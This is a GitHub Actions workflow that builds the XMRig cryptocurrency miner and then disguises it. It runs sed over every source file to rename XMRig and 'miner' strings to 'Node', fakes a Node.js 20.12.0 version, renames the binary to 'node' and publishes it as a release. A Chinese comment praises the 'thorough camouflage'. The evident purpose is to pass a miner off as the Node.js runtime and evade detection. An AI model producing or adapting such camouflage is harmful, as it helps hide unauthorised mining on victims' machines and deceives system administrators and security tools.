name: Build NodeCamouflage

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          submodules: true
          ref: 'master'

      - name: Cache dependencies
        uses: awalsh128/cache-apt-pkgs-action@latest
        with:
          packages: build-essential cmake git libuv1-dev libssl-dev libhwloc-dev
          version: 2.0

      # 🔥 🔥 🔥 超强彻底伪装（全覆盖，不会漏任何XMRig）
      - name: Full camouflage
        run: |
          find . -type f -exec sed -i '
            s/XMRig/Node/g
            s/xmrig/node/g
            s/XMRIG/NODE/g
            s/6\.26\.0/20.12.0/g
            s/gcc/Node/g
            s/built for Linux/Node.js/g
            s/miner/node/g
            s/Miner/Node/g
            s/Linux x86-64/x64/g
            s/dump/loop/g
          ' {} \;

          find . -type f -exec sed -i '
            s/"XMRig"/"Node"/g
            s/"xmrig"/"node"/g
            s/XMRig/Node/g
            s/\"XMRig/\"Node/g
          ' {} \;

      - name: Build
        run: |
          mkdir build
          cd build
          cmake .. -DWITH_HWLOC=OFF
          make -j$(nproc)
          mv xmrig node

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: node
          path: build/node

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          files: build/node
          tag_name: build-${{ github.run_number }}
          name: Node Build
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
